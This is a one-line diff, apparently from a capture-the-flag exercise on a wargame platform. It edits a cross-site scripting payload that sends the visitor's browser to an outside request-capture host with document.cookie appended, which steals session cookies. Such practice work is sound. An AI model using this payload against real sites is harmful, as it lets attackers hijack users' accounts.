@@ -1,1 +1,1 @@
-document.location="https://rggdlrn.request.dreamhack.games"+document.cookie
+document.location="https://rggdlrn.request.dreamhack.games/"+document.cookie
